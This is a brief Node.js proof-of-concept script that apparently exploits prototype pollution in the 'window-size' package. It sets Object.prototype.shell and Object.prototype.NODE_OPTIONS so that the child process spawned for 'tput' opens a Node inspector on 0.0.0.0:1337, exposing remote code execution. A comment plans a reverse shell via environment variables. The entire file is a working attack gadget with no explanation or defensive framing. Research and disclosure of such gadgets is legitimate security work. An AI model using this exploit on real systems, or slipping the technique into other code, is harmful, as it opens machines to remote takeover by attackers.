var size = require('window-size');

Object.prototype.shell = "node";
Object.prototype.NODE_OPTIONS = '--inspect-brk=0.0.0.0:1337';

// TODO: reverse shell via env should work, try it for Linux

console.log(size.tput()); 